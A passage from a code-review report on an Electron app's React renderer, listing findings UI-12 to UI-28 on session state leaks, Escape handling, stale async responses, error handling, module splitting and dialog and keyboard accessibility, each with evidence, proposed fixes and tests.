- **Constraints:** the documented behaviour is "a worktree added or removed on disk shows up with the
  next rescan" (useAllWorktrees.ts 4–6). If that must be kept, also re-list on explicit Refresh.
- **Depends on:** none.

#### UI-12: Composer draft, attachments and model leak across sessions (bug)

**Lead review:** Re-verified: no `key` on `<Composer>` and no reset effect. This is the highest-value one-line fix in the report.

- **Category:** state
- **Severity:** high
- **Effort:** S
- **Evidence:** `SessionColumn.tsx 550–557` renders `<Composer session={activeSession} …/>` with no
  `key`, inside a block that stays mounted when switching between two real sessions. `Composer`
  keeps `text`, `attachments` and `model` in local state (Composer.tsx 48–51) and never resets them
  on `session` change. Result: type a message in session A, switch tab to B, press Enter, and the
  text A was meant for goes to B (`send` uses the current `ptyId`/`session`, 81–105). The model
  select shows A's choice for B. `EditableSessionTitle` right above it *is* keyed
  (`key={activeSession.sessionId}`, 515), and `Transcript` resets itself by effect (116–144), which
  shows the pattern was intended.
- **What:** `key={activeSession.sessionId}` on `Composer`. This is the minimal fix, and it discards
  the draft. Better UX is a per-session draft map (`Map<sessionId, {text, attachments}>` in
  SessionColumn or the workspace store) so switching back restores the draft.
- **Why:** sending a prompt into the wrong Claude session is a correctness problem.
- **Gain:** drafts can no longer be misdirected.
- **Implementation steps:** (1) add the key; (2) add a component test: type in A, switch to B,
  assert the composer is empty; (3) optionally, the draft map.
- **Verification:** new test in `tests/component/composer.test.tsx`; e2e `composer.spec.ts`.
- **Constraints:** none.
- **Depends on:** none.

#### UI-13: Escape handling is copy-pasted 9 times and fires through nested UI (bug)

**Lead review:** Re-verified the bubbling path (`ThemesSection.tsx:256` → `SettingsDialog.tsx:115-123`). Step 2 is Phase 0; the `useEscape` stack is Phase 7.

- **Category:** effects
- **Severity:** medium
- **Effort:** S
- **Evidence:** a document-level `keydown` Escape listener is hand-written in ContextMenu (66–82),
  GitMenu (66–85), LayoutPicker (69–77), BranchSwitcher (97–105), NoteDialog (34–42), SettingsDialog
  (115–123), ImportDialog (76–84) and ImageLightbox (10–18). Bug: in Settings → Themes, pressing
  Escape in the theme-name field (ThemesSection.tsx 256:
  `onKeyDown={(e) => { if (e.key === 'Escape') setNaming(null) }}`, with no `stopPropagation`)
  bubbles to the document and **SettingsDialog's listener closes the whole dialog**, which also
  reverts any preview (ThemesSection 81). Note that `e.stopPropagation()` in these document
  listeners does not stop *other* document listeners, because they are on the same node, so two open
  layers both close.
- **What:** `ui/useEscape(onEscape, { enabled })` backed by a module-level LIFO stack. Only the
  top-most registered layer handles Escape and it calls `stopImmediatePropagation`. Replace the
  9 copies. Inline editors (theme name, group rename in Sidebar 883, terminal rename,
  EditableSessionTitle 51) either register as layers or call `e.stopPropagation()` in their React
  handler, which stops native propagation at the React root in React 18.
- **Gain:** one behaviour, no double-closing, and the reported bug fixed.
- **Implementation steps:** (1) hook plus unit test with a fake document; (2) fix ThemesSection 256
  immediately with `e.stopPropagation()` (1-line); (3) migrate callers one per commit.
- **Verification:** new component test in `themes.test.tsx` (Escape in the name field keeps Settings
  open); existing `contextMenu`, `gitMenu`, `settings`, `import`, `sessionNotes`, `paneLayouts`
  (picker Escape) tests.
- **Constraints:** BranchSwitcher's deliberate "Escape closes outright from any step" (87–96) must be
  preserved.
- **Depends on:** none. UI-25 builds on it.

#### UI-14: Async effects that can apply stale responses

**Lead review:** Independent of MAIN-9, which reduces the cost of each poll in main.

- **Category:** effects
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - `SessionColumn.tsx 154–157`: `loadGitStatus` does `.then(setGitStatus)` with no guard. Switch tab
    A→B quickly and A's slower `git status` can land after B's, so the toolbar shows A's branch,
    and "Copy branch" / "Push" labels then describe the wrong repo until the next 5 s poll.
  - `pluginBar.tsx 37–44`: same shape. A stale response puts A's MR button on B.
  - `SettingsDialog.tsx 110–113`: `logStatus()` with no cancellation (minor).
  - `App.tsx 885–907`: overlapping `tree()` responses can apply out of order (an older tree
    overwrites newer titles). This goes away with UI-3.
- **What:** a request-id or `cancelled` guard keyed to `shellKey`, the way `Transcript`'s
  `generationRef` (Transcript.tsx 78–90) and `useTree`'s `requestId` (useTree.ts 44–57) already do.
  A tiny `useLatestAsync(fn, deps)` helper would remove the repetition.
- **Gain:** toolbar and plugin bar always describe the tab in front.
- **Verification:** component `gitToolbar.test.tsx` (add a delayed fake `gitStatus` for A and assert
  B's branch shows); e2e `pluginBar.spec.ts`, `gitToolbar.spec.ts`.
- **Constraints:** plugin results stay off the render path (CLAUDE.md "Session-bar plugins").
- **Depends on:** none.

#### UI-15: `react-hooks/exhaustive-deps` disables: assessment

- **Category:** effects
- **Severity:** low
- **Effort:** S
- **Evidence and assessment:**
  1. `App.tsx:335` (resume the restored `live` ids once). Justified: `restored` is read-once state and
     a re-run would respawn. It is safer than it looks because there is no StrictMode double-invoke
     (main.tsx 19–26). Keep it, but add a `useRef` latch like 670 so the disable no longer carries the
     safety guarantee (if StrictMode is ever added, today's code resumes twice).
  2. `App.tsx:698` (restore selection once). **Load-bearing, not cosmetic:** listing the real deps
     (`openSessionTab`, which changes with `activeColumnId`) would run the cleanup
     (`cancelled = true`, 696) mid-fetch while the `restoreAttempted` latch blocks the re-run, and the
     restore would be silently lost. Keep it, and say so in the reason text
     (`-- listing openSessionTab would cancel the in-flight restore on the first focus change`).
  3. `BranchSwitcher.tsx:84` (list refs once). Acceptable, but it hides a real edge: if the column's
     active tab changes under the open modal (e.g. `onSelectTab` from another window, App
     1224–1231), the list still shows repo A's refs while actions use the new `shellKey`. Fix by
     `key={shellKey}` on `<BranchSwitcher>` in SessionColumn 761, then list `[shellKey, isPtyId]`
     honestly with a cancel guard, and the disable goes away.
  4. `TerminalListPanel.tsx:58` (rename request). Justified (only a new request should start a
     rename). Keep.
  5. `ThemeEffects.tsx:148` (`signature` stands in for `effects`). Justified. Could be removed with
     `const canvasEffects = useMemo(() => effects.filter(...), [signature])`, but that trades one
     disable for another. Keep.
- **What:** items 1 and 3 as above; add the reason text to 2.
- **Verification:** `npm run lint` (`reportUnusedDisableDirectives`), component `gitMenu`,
  `gitToolbar`; e2e `restoreWindows.spec.ts`.
- **Constraints:** CLAUDE.md: "A disable comment is fine when it says why (`-- <reason>`)". Three
  of the five have no `-- reason` suffix today.
- **Depends on:** none.

#### UI-16: BranchSwitcher: shows raw IPC error text, repeats its async boilerplate 6 times, reports errors twice

- **Category:** error-handling
- **Severity:** medium
- **Effort:** S
- **Evidence:** `reportError((e as Error).message)` (137, 152, 166, 183, 208; `e.message` at 77)
  puts Electron's `Error invoking remote method 'apiary:…': Error: …` prefix straight into the
  in-modal banner, although `errors.ts` exists to strip it and "Every path that shows a failure to
  the user goes through here" (errors.ts 7–8). `reportError` also calls `onError`, which
  SessionColumn turns into a toast (769), so each failure shows twice: banner plus toast. The
  comment at 54–57 still refers to "App.tsx's error-banner", which no longer exists. `checkout`,
  `checkoutRemote`, `checkoutDetached`, `mergeRef` and `createBranch` (122–212) are the same
  try/busy/close block 5 times. ThemesSection has a third private copy of the prefix regex (96).
- **What:** `const run = async (op: () => Promise<unknown>) => { setErrorMessage(null); setBusy(true);
  try { await op(); onCheckedOut(); onClose() } catch (e) { setErrorMessage(describeError(e).message) }
  finally { setBusy(false) } }`. Drop the `onError` duplicate, or keep it only for the initial
  `gitListRefs` failure where there is no banner yet. Use `describeError` in ThemesSection 96.
  Split the file into `BranchSwitcher.tsx` (steps), `BranchList.tsx` (`BranchSection`) and
  `RefRowButtons.tsx` (Pull/Copy).
- **Gain:** readable errors, one notification per failure, and about 80 fewer lines.
- **Verification:** component `gitMenu.test.tsx`, `gitToolbar.test.tsx`; e2e `gitMenu.spec.ts`,
  `gitToolbar.spec.ts`.
- **Constraints:** a conflicting merge keeps the popup open with git's CONFLICT text (180–183), so
  `run` must not close on error.
- **Depends on:** none.

#### UI-17: Stringly-typed pty ids built and parsed in several places

**Lead review:** Merged into MAIN-21 (one shared helper for both processes). Use this finding for the renderer call sites and `ptyKeyFor`.

- **Category:** state
- **Severity:** medium
- **Effort:** S
- **Evidence:** `shell:${key}:${n}` is built at SessionColumn.tsx 252, 351, 720, 725 (and in main,
  appService.ts 687, 706) and parsed by regex at App.tsx 466 (`/^shell:(.+):([^:]+)$/`). `new:` is
  tested with `id.startsWith('new:')` (App 455) and minted in main (appService 939, 960). The
  "which pty does this tab run under" rule `ptyOverrides.get(k) ?? k` appears at App 594, 1036, 1094,
  1197, `shared/layoutReport.ts 44`, and in a slightly different form in SessionColumn 137–140
  (`pending.has(k) ? k : ptyOverrides.get(k) ?? k`).
- **What:** `src/shared/ptyIds.ts` (shared because main mints the same shapes, per the CLAUDE.md
  rule on pure helpers wanted on both sides): `newSessionPtyId()`, `isPendingPtyId(id)`,
  `shellPtyId(key, terminalId)`, `parseShellPtyId(id): { key; terminalId } | null`. In the
  renderer, add `ptyKeyFor(tab, { ptyOverrides, pending })` once (workspace selector) and use it
  everywhere.
- **Why:** the greedy-colon parsing subtlety (App 463–465) is exactly what a helper plus unit test
  should own.
- **Gain:** one tested definition; divergence between App's and SessionColumn's `keyFor` becomes
  impossible.
- **Verification:** `tests/unit/ptyIds.test.ts` (including `shell:new:<uuid>:3`); component
  `multiTerminal`, `newSession`; e2e `multiTerminal.spec.ts`, `sessionFollowing.spec.ts`.
- **Constraints:** ids must be byte-identical to today's, since persisted layouts and live ptys use
  them.
- **Depends on:** none (the main-side adoption belongs to the main-process reviewer).

#### UI-18: State modules: mostly pure, with a few misplacements and dead code

**Lead review:** The `useDebouncedValue.ts` deletion is also listed in TEST-19; do it once.

- **Category:** state
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - Pure and tested: `layout.ts`, `columns.ts`, `groups.ts`, `recentSessions.ts`, `allWorktrees.ts`,
    `branchSelection.ts`, `refreshSummary.ts`, `updateSummary.ts`, `terminalPaste.ts` (unit tests
    exist for each).
  - `columns.ts:32–36`: `newColumn` mutates a module-global counter (`let nextColumnId`), so
    `layout.ts` functions that call it (`fill` → `waiting()`, `placeInZone`, `openBeside`) are not
    referentially pure; ids depend on test order. App 171–175 documents a collision this caused.
    An injectable id source (`newColumn(tabs, id = nextId())`) keeps tests deterministic.
  - Stale comments: `columns.ts:78–79` and `layout.ts:246` refer to `pruneColumns`, which no
    longer exists (it is now `tidyLayout`).
  - Dead: `state/useDebouncedValue.ts` has no importer (grep). `useTree.ts:38`
    `const debouncedQuery = query` is a vestigial alias.
  - Mixed concerns: `uiState.ts` holds the UiState model *and* URL parsing for `detach`, `transfer`
    and `restore` (96–145), and App parses `w` again itself (1051–1057); both belong in
    `state/windowParams.ts` (read once at module load). `notifications.tsx` sits in `state/` but is a
    provider plus UI policy. `useMrStatuses.ts` and `useHoverCard.ts` are hooks living in
    `components/`. `relativeTime` is exported from `SessionRow.tsx` and imported by `PaneFiller`
    (PaneFiller.tsx 3). `mergeLatestPage` (Transcript.tsx 28) is pure logic inside a component
    and has no test.
  - Duplicate tree walkers: `findSessionById`, `collectSessionIds`, `flattenTree`
    (App 59–95), `flattenSessions`, `folderBranches`, `allFolderPaths`, `pathsToSession`,
    `countSessions` (Sidebar 29–159), `descendantPaths` (SessionTree 10), `flatten` (PaneFiller 7).
    That is 11 recursive walkers over `ProjectNode[]`. There is also a misplaced doc comment at App 83–88
    (describes `findNewSessionByCwd` but sits on `flattenTree`), and another at Sidebar 140–146.
- **What:** `src/shared/treeWalk.ts` (`flattenSessions`, `sessionIndex`, `folderPaths`,
  `pathToSession`, `countSessions`) with a unit test; ideally computed once per tree version in the
  tree store (UI-3). Delete `useDebouncedValue`. Move `relativeTime` and `fullTime` to
  `ui/format.ts`, and `mergeLatestPage` to `state/transcriptMerge.ts`. Add `windowParams.ts`.
- **Verification:** `npm test` (unit, new tests), typecheck, `npm run test:component`.
- **Constraints:** shared code must not import either side (ESLint area blocks).
- **Depends on:** none.

#### UI-19: Split Sidebar.tsx (951 lines) into sections + hooks

- **Category:** modularity
- **Severity:** medium
- **Effort:** M
- **Evidence:** one component renders 7 regions: header (524–567), Active (595–651), Pinned
  (653–709), Recent (711–743), Pending (745–785), flat results (787–806), and grouped tree with group
  DnD and inline rename (808–939). It also contains a context-menu model for 3 kinds (383–469), group
  mutations (353–381, 474–484), reveal logic (214–247) and refresh (547–559). The chevron SVG is
  inlined 3 times (661–670, 719–721, 897–899), and 5 more times elsewhere (SessionTree 261, SessionColumn
  604, ToolBlock 23, GitMenu 109), for 8 copies of `M6 4l4 4-4 4` in total.
- **What:**

  ```text
  features/sidebar/
    Sidebar.tsx                  // frame + header + list; composes sections (~200 lines)
    SidebarHeader.tsx            // hide, SearchField, Refresh (+ useRefreshSessions)
    sections/ActiveSection.tsx   // + ActiveTabTitle, ActivityLegend anchor
    sections/PinnedSection.tsx   // pinned DnD reorder
    sections/RecentSection.tsx
    sections/PendingSection.tsx
    sections/SearchResults.tsx   // rankedResults
    sections/GroupedTree.tsx     // FolderGroup + DnD + inline rename
    SectionHeader.tsx            // the shared .pinned-header button w/ chevron + count
    useRevealSession.ts          // 214–247
    useSidebarMenu.ts            // menu state + menuItems() for folder/group/session
    useGroupActions.ts           // patchGroups/assignFolder/startNewGroup/commitRename/reorderFolder
    SessionTree.tsx, SessionRow.tsx, FolderHeader.tsx (split out of SessionTree.tsx)
  ui/icons/ChevronIcon.tsx
  ```

- **Gain:** each section can be memoised independently (Active re-renders at 2 Hz without touching
  the tree), and the files match what tests are named after (activeSection, pinning, sidebarGroups,
  search).
- **Implementation steps:** extract bottom-up: `ChevronIcon` → `SectionHeader` → the sections one
  per commit → the hooks. Keep every `data-testid`.
- **Verification:** component `sidebar`, `sidebarFolders`, `sidebarGroups`, `pinning`,
  `activeSection`, `search`, `sidebarPopups`, `nestedReorder`, `allWorktrees`; e2e same names.
- **Constraints:** keep the `onDrop` stopPropagation between folder row and group section
  (SessionTree.tsx 215–222; Sidebar 865). The reveal latches (`scrolledTo`, `expandedFor`) must move
  together (they fix a documented collapse bug, 215–229).
- **Depends on:** UI-1 step 1 (fewer props to thread) helps but is not required.

#### UI-20: SettingsDialog: claims to be data-driven but is a 600-line ternary; make sections a registry

- **Category:** modularity
- **Severity:** medium
- **Effort:** M
- **Evidence:** the header comment says "Sections are data, not markup — adding a setting later means
  adding an entry here" (17–20), but only id, label and blurb are data (29–43). The content is one
  `section === 'x' ? … :` chain from 168 to 797. The same checkbox-row markup is repeated about 14 times
  (e.g. 179–194, 196–211, 251–267). The number-with-clamp pattern
  `Number.isFinite(n) && n >= 1 ? Math.min(MAX, Math.round(n)) : 1` is repeated 6 times (226, 376,
  540, 649, 706, 722). `settingsGet().then(setDraft)` has no catch (105), so a failure leaves
  "Loading settings…" forever plus a generic toast. `save()` has `try/finally` without `catch`
  (129–141), so a failed save surfaces only as "Unexpected error: …" from the global net. The dialog
  calls `useUpdate()` (81), creating a *second* updater subscription, even though useUpdate.ts 7 says "One
  subscription, shared by the banner and the Settings panel".
- **What:**

  ```text
  features/settings/
    SettingsDialog.tsx              // shell: nav, pane, footer, draft load/save
    registry.ts                     // SECTIONS: { id, label, blurb, Component }[]
    fields/CheckboxSetting.tsx      // {testId,label,help,checked,onChange,disabled?}
    fields/NumberSetting.tsx        // {testId,min,max,value,onChange,unit,presets?}
    fields/PluginField.tsx
    sections/SessionsSection.tsx, SearchSection.tsx, SidebarSection.tsx, TerminalSection.tsx,
    sections/PluginsSection.tsx, UpdatesSection.tsx, GeneralSection.tsx, DiagnosticsSection.tsx
    sections/ThemesSection/ (UI-22)
  ```

  Section contract: `({ draft, patch }: { draft: AppSettingsPayload; patch: (p: Partial<…>) => void })`.
  Sections that own async state (Search index status, Diagnostics log status, Updates check) keep
  it inside themselves, which also scopes their effects: today `onTreeChanged(loadIndexStatus)`
  (102) runs for the dialog's whole life even on the Themes tab. Adding a setting becomes one
  `<CheckboxSetting>` line in one section file. Adding a section becomes one registry entry.
  Pass `update` down from App instead of re-subscribing.
- **Gain:** the file drops from 875 lines to about 120 (shell) plus 8 files of 40–120 lines.
  Clamping is correct by construction.
- **Implementation steps:** (1) `NumberSetting`/`CheckboxSetting` in place; (2) move one section
  per commit into its file, rendered via the registry; (3) catches on load and save with
  `notifyError(e, 'Could not save settings')`, keeping the dialog open.
- **Verification:** component `settings.test.tsx`, `diagnostics.test.tsx`, `update.test.tsx`,
  `themes.test.tsx`, `search.test.tsx`; e2e `settings.spec.ts`, `diagnostics.spec.ts`,
  `update.spec.ts`.
- **Constraints:** "treat a missing field as unchanged" is main's merge rule, and the dialog still
  sends the whole draft (it must not start sending partials without the main reviewer's
  agreement). The Plugins section stays generic: "Nothing in the settings dialog knows what a field
  means" (CLAUDE.md). Keep all `data-testid`s. `initialSection` routing (App 282).
- **Depends on:** none.

#### UI-21: Split SessionColumn.tsx (805 lines)

- **Category:** modularity
- **Severity:** medium
- **Effort:** M
- **Evidence:** one component owns the tab bar wiring, header and title rename, transcript/composer,
  claude terminals, the shell pane with terminal CRUD (195–367), git status polling and actions
  (154–177, 369–420), the toolbar model (597–695, a 100-line inline array), plugin bar, branch
  picker, worktree-conflict dialog (776–802), pane-drop overlay (452–472) and lightbox. It has 34 props
  and 26 references to App-owned `shellTabs`/`activeTerminal`.
- **What:**

  ```text
  features/pane/
    SessionColumn.tsx          // composition only
    PaneDropOverlay.tsx        // 452–472
    SessionHeader.tsx          // 502–534 (title/pending title/cwd/ResumeBar)
    SessionBody.tsx            // transcript+composer and claude terminals (536–579)
    ShellPane.tsx              // bottom card: resizer, toolbar, GitMenu, terminal views, list panel
    useShellTerminals.ts       // ensureShellFor/add/rename/reorder/switch/delete/revive (195–367)
    useGitStatus.ts            // load + poll + race guard (UI-14)
    useGitActions.ts           // runGitAction, menu items, branch picker + worktree conflict state
    shellToolbar.ts            // buildShellToolbar(gitStatus, busy, ...): ToolbarButtonSpec[]
  ```

  `useShellTerminals` dispatches workspace actions (UI-2) instead of receiving `setShellTabs`.
- **Gain:** the terminal lifecycle (revival, auto-open, spawning guard), which is the subtle part,
  lives in one hook that can be tested in isolation with a fake bridge.
- **Verification:** component `multiTerminal` (11), `terminal`, `gitToolbar` (10), `gitMenu`,
  `sessionTabs`, `composer`, `paneLayouts`; e2e `multiTerminal.spec.ts`, `terminal.spec.ts`,
  `gitToolbar.spec.ts`, `restoreWindows.spec.ts` (revival after relaunch).
- **Constraints:** terminal wrappers stay keyed by pty id, not tab key (566–570); shells stay mounted
  while hidden (705–716); `spawningRef` must remain shared across both columns (201–205). In a
  split, the ref should move to the workspace level if `useShellTerminals` becomes per-column.
- **Depends on:** UI-2 (preferred), UI-14.

#### UI-22: ThemesSection and the theme hooks

- **Category:** modularity
- **Severity:** low
- **Effort:** S–M
- **Evidence:** ThemesSection (383 lines) mixes generator and preview history (84–103, 179–238),
  current-theme naming (113–127, 240–289), theme grid (291–331) and options (333–380). `useThemeState`
  calls `applyTheme(next.active)` inside each instance's subscription (useTheme.ts 16–19), and it is
  used by both App (127) and ThemesSection (60). So while Settings is open, **each theme broadcast
  applies the theme twice**. Each `applyTheme` removes and resets every var and dispatches
  `THEME_CHANGE_EVENT`, and every mounted `TerminalView` then re-reads computed style
  (TerminalView.tsx 266–276). The error-prefix regex is duplicated (96). `run(...)` calls `p.catch`
  but a rejected `themeApply` inside `.then` in `submitName` also reaches `setNaming(null)` first
  (126), which is fine; noted.
- **What:** `theme/themeStore.ts` (a `useSyncExternalStore` store, one subscription, `applyTheme` called
  once per broadcast), with `useThemeState()` as a selector. Split ThemesSection into
  `ThemeGenerator.tsx` (+ `usePreviewHistory`), `CurrentTheme.tsx`, `ThemeGrid.tsx`,
  `ThemeOptions.tsx`. Use `describeError`.
- **Verification:** component `themes.test.tsx`, `lookAndFeel.test.tsx`; e2e `themes.spec.ts`;
  bench `themePerf.spec.ts` after moving `applyTheme`.
- **Constraints:** "A preview belongs to one window and one screen" and is reverted on unmount
  (ThemesSection 77–82); `initialTheme` is applied before first paint (main.tsx 12); nothing a theme
  contains is parsed as CSS.
- **Depends on:** UI-13 (Escape) for the naming field.

#### UI-23: IPC promise chains with no `catch` surface as context-free "Unexpected error"

**Lead review:** Correction: `no-floating-promises` is already on (`eslint.config.js:49`) with `ignoreVoid: true`. The gap is `void p.then(...)` without a `catch`. Use MAIN-19's `fireAndForget` helper, and consider `ignoreVoid: false`.

- **Category:** error-handling
- **Severity:** medium
- **Effort:** S
- **Evidence:** no catch at App.tsx 132 (`themeGpuCompositing`), 434 and 1468 (`tree` then `addPending`;
  1468 has one), 507, 588, 886 (`tree` in effects, re-fired on every tree change);
  `useActiveTabs.ts:11`; `useTheme.ts:22`; `ImportDialog.tsx:63, 73`; `SettingsDialog.tsx:105`;
  `TranscriptImage.tsx:22`; `SessionRow.tsx:21`. The last one caches a *rejected* promise forever,
  and each row's `.then` (98) has no catch, so one failure produces one unhandled rejection per
  mounted row. `onResume` (App 978–986) awaits `checkConflict` with no try, and callers `void` it
  (1426), so a failure becomes a generic toast. All of these fall to `NotificationProvider`'s window
  net (notifications.tsx 127–132), which prints "Unexpected error: <raw>". Dedupe (91) limits the
  spam, but the message never says *what* failed.
- **What:** give each call site a deliberate policy. Background refresh: swallow with a comment, as
  `useSessionTreeCache` does. User-initiated: `notifyError(e, 'Could not …')`. Cache the
  VS Code probe as `.catch(() => false)`. Add an ESLint rule `@typescript-eslint/no-floating-promises`
  (it is already type-aware) to keep `void p` explicit, and consider a custom rule or code review
  checklist for "then without catch".
- **Gain:** every failure names its context, and background noise is not surfaced.
- **Verification:** component `errorReporting.test.tsx` (extend: make fake `discovered()` reject and
  assert a toast with "Could not list sessions"); `npm run lint`.
- **Constraints:** CLAUDE.md's "no failure disappears silently" design (ErrorBoundary.tsx 28–30,
  notifications.tsx 52–59). Swallowing is fine only where the comment says why.
- **Depends on:** none.

#### UI-24: ErrorBoundary coverage gaps

- **Category:** error-handling
- **Severity:** medium
- **Effort:** S
- **Evidence:** boundaries exist at the root (main.tsx 21) and per pane (App 1388–1400). The Sidebar
  (1288) and all dialogs (1548–1617) sit only under the root boundary, so a render error in a sidebar
  row (e.g. an unexpected title shape in `MrRefText`) or in SettingsDialog replaces the *entire
  window*, panes and terminals included, with the crash pane. The xterm instances are disposed and the
  ptys keep running in main, but the user has to Reload. The pane boundary has no reset key, so after
  a crash, picking a different session in that pane keeps showing the crash pane until "Try again"
  is pressed (ErrorBoundary.tsx 63 only resets on click).
- **What:** wrap `<Sidebar>` in `<ErrorBoundary label="The sidebar">` and the dialog host in
  `<ErrorBoundary label="This dialog" onReset={closeDialog}>`. Add `resetKey?: unknown` to
  ErrorBoundary (`componentDidUpdate`: if `resetKey` changed while errored, clear) and pass
  `column.activeKey` from App. Optionally add a boundary around each `TerminalView`.
- **Gain:** a fault stays in its region, which is the stated purpose (App 1385–1387).
- **Verification:** component `errorReporting.test.tsx` (add: throw from a fake session title in the
  sidebar and assert panes still render).
- **Constraints:** the grid-area style pass-through (ErrorBoundary.tsx 10–12) must be kept for pane
  boundaries.
- **Depends on:** UI-1 step 5 (dialog host) for the dialog boundary.

#### UI-25: Dialogs: no focus management, 4 of them no Escape, no accessible names

- **Category:** a11y
- **Severity:** high
- **Effort:** M
- **Evidence:** `DeleteSessionDialog`, `ConflictDialog`, `MoveSessionDialog` and
  `WorktreeConflictDialog` have no Escape handler (grep) and no initial focus. None of the 8 dialogs
  traps Tab or restores focus on close, so Tab from an open modal walks into the sidebar and
  terminals behind the backdrop, despite `aria-modal="true"`. There are **0 `aria-labelledby`** in
  the renderer, so every `role="dialog"` is announced without a name (e.g. DeleteSessionDialog.tsx
  10–11). Dialog buttons rely on contextual CSS (`.modal-actions button`) instead of `.btn` (see
  UI-30).
- **What:** one `ui/Modal.tsx` primitive:
  `<Modal labelledBy|title onClose initialFocus="confirm|cancel|first" testId className>`. It
  renders backdrop plus `role="dialog" aria-modal aria-labelledby`, registers with `useEscape`
  (UI-13), focuses `initialFocus` on mount, traps Tab within the modal, and restores focus to
  `document.activeElement`-at-open on unmount. Migrate all 8 dialogs. Destructive confirms (Delete)
  should focus Cancel. **Native `<dialog>.showModal()`** would give trap, inert and restore for free,
  but it puts the dialog in the top layer *above* the notification stack. That breaks the documented
  requirement that "a failure raised while a dialog is open still has to be readable over it"
  (styles.css 1440–1446). Only adopt it together with moving `NotificationCenter` to
  `popover="manual"` (also top layer, shown later, so it stacks above).
- **Gain:** keyboard and screen-reader users can operate every dialog, and focus returns to where
  they were (e.g. the terminal) after closing.
- **Implementation steps:** (1) Modal + unit/component test for trap and restore; (2) migrate
  Delete/Conflict/Move/WorktreeConflict (they gain Escape); (3) Note, Import, Settings,
  BranchSwitcher.
- **Verification:** component `deleteSession`, `moveSession`, `sessionNotes`, `import`,
  `settings`, `gitMenu` (worktree conflict); add a test that Tab stays inside and focus returns to
  the opener; e2e `deleteSession.spec.ts`, `moveSession.spec.ts`. Consider adding
  `@axe-core/playwright` to one e2e spec (tooling is another reviewer's area, so just flag it).
- **Constraints:** floating surfaces are solid and paint the panel colour (CLAUDE.md Themes); no
  `backdrop-filter` on the backdrop.
- **Depends on:** UI-13.

#### UI-26: Tabs, menus and hover cards: ARIA roles that don't match behaviour

- **Category:** a11y
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `SessionTabBar.tsx:132` puts `role="tablist"` on a container that also holds the layout button,
    split button and per-tab close/arrange buttons (234–252, 260–276). Tabs have `role="tab"` and
    `aria-selected` (226–227) but no `aria-controls`, no `tabpanel` exists, every tab is its own Tab
    stop, and there is no Arrow/Home/End handling.
  - `ContextMenu.tsx 86–113`: `role="menu"` is portalled to the end of `<body>` and never receives
    focus (so Tab reaches it last, after the whole app), with no arrow-key navigation and no focus
    restore. `GitMenu.tsx 131, 90–91`: `role="menu"` on a `ul` whose children are `li > button`
    without `role="menuitem"` (li keeps `listitem`, which is invalid inside `menu`); submenu opens
    only on hover or click, with no ArrowRight.
  - `HoverCard.tsx` uses `role="tooltip"` but contains buttons (copy, pull, open in VS Code), and it
    opens only on `mouseenter` (SessionRow.tsx 129). A keyboard user can never reach a session's
    path, branch, note or the "Open in VS Code" action.
  - `BranchSwitcher.tsx 88–91` says focus "moves between the list's buttons as you arrow around",
    but there is no arrow handling; only Enter on an exact match (262–268).
  - Done well, for reference: LayoutPicker has arrow-key grid navigation (79–97);
    TerminalListPanel has roving focus plus F2 (67–99).
- **What:** (a) Tab strip: move `role="tablist"` to `.session-tab-strip`; roving `tabIndex`
  (active 0, others −1); ArrowLeft/Right/Home/End; close via Delete or Cmd/Ctrl+W on the focused tab;
  `aria-controls` pointing at the pane body (`role="tabpanel"` on `.centre-pane`). (b) A
  `ui/Menu.tsx` primitive used by ContextMenu and GitMenu: focus the first enabled item on open,
  arrows/Home/End, ArrowRight/Left for submenus, restore focus to the opener, `role="menuitem"` on
  the buttons and `role="none"` on the `li`s. (c) HoverCard: `role="dialog"` (non-modal) or
  `role="group"` with a label, and open it on row focus too (`onFocus` → `openNow` after the delay,
  `onBlur` → `scheduleClose`). (d) BranchSwitcher: `role="listbox"` pattern or ArrowUp/Down moving
  focus between rows.
- **Gain:** the main navigation surfaces work from the keyboard.
- **Verification:** component `sessionTabs` (23), `contextMenu`, `gitMenu`, `sidebarPopups`; add
  keyboard tests per widget. e2e `sessionTabs.spec.ts` (drag tests unaffected).
- **Constraints:** terminal key handling goes through `attachCustomKeyEventHandler` (CLAUDE.md), so
  new global shortcuts must not steal keys from a focused xterm. Scope tab-strip keys to the strip.
- **Depends on:** UI-13.

#### UI-27: Sidebar tree and resizers are pointer-first

- **Category:** a11y
- **Severity:** medium
- **Effort:** L
- **Evidence:** every `SessionRow` contributes 5 Tab stops (row, note, pin, split, delete;
  SessionRow.tsx 168–244, none with `tabIndex={-1}`), plus 2–3 per folder row (SessionTree.tsx
  255–301). With 500 visible sessions that is about 2,500 Tab stops to cross the sidebar. There is no
  `role="tree"`/`treeitem` and no `aria-level` (depth exists as `data-depth`, SessionTree 179), and no
  arrow navigation. All DnD (pin reorder, folder reorder, group filing, move session) is
  mouse-only; the group menu offers Move up/down for keyboard (Sidebar 450–456), but folders and
  pinned rows have no keyboard alternative. Resizers (`.sidebar-resizer` App 1368–1372,
  `.bottom-resizer` SessionColumn 588–592, PaneDividers `aria-hidden="true"` 59) have no
  `role="separator"`, no `tabIndex` and no keys.
- **What:** (1) cheap first: `tabIndex={-1}` on `.row-action` buttons (they are already revealed on
  `:focus-within`, styles 847) and expose them through the row's context menu (Shift+F10 /
  ContextMenu key → `onMenu`). (2) Roving-tabindex tree: `role="tree"` on the sidebar list,
  `treeitem` with `aria-level`/`aria-expanded` on folder and session rows; Up/Down move, Left/Right
  collapse/expand or go to parent, Enter opens, Shift+Enter splits. (3) "Move up/down" items in
  the pinned and folder context menus. (4) Resizers: `role="separator" aria-orientation
  aria-valuenow tabIndex=0`, arrow keys step by 16 px.
- **Gain:** the library is navigable without a pointer.
- **Verification:** component `sidebar`, `sidebarFolders`, `pinning`, `sidebarGroups`,
  `paneLayouts` (divider); new keyboard tests.
- **Constraints:** keep `data-testid`s. Keep row buttons as siblings of the row button (a `<button>`
  cannot contain buttons; SessionRow 82–83).
- **Depends on:** UI-19 (split first).

#### UI-28: A hover-opened layout picker steals keyboard focus

- **Category:** a11y
- **Severity:** medium
- **Effort:** S
- **Evidence:** `LayoutMenuButton` opens the picker on *hover* (`onMouseEnter={hover.arm}`, 50), and
  `LayoutPicker` focuses its first button as soon as it has a position (59–62), however it was
  opened. Resting the pointer on a tab's arrange button or a row's split button while typing in a
  terminal or the composer therefore moves focus into the picker. When the pointer leaves, the picker
  unmounts through `scheduleClose` (not `onClose`, so the focus restore at LayoutMenuButton.tsx 68 does
  not run) and focus falls to `<body>`. The next keystrokes go nowhere.
